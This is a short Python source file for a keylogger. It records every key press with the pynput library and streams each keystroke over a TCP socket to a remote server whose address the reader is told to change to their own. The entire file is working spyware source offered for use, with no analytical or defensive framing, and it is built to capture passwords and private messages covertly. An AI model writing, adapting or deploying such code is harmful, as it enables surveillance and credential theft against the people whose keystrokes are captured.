import socket
from pynput import keyboard

# === CONFIG ===
SERVER_IP = '192.168.31.66'     # Change to your server IP
SERVER_PORT = 9999

# === Socket Setup ===
client_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
try:
    client_socket.connect((SERVER_IP, SERVER_PORT))
except Exception as e:
    print(f"[ERROR] Cannot connect to server: {e}")
    exit()

def on_press(key):
    try:
        key_data = key.char
    except AttributeError:
        key_data = f"[{key.name}]"

    try:
        client_socket.send(key_data.encode('utf-8'))
    except Exception as e:
        print(f"[ERROR] Failed to send data: {e}")
        client_socket.close()

def main():
    print("[+] Keylogger started. Sending data to server.")
    with keyboard.Listener(on_press=on_press) as listener:
        listener.join()

if __name__ == "__main__":
    main()
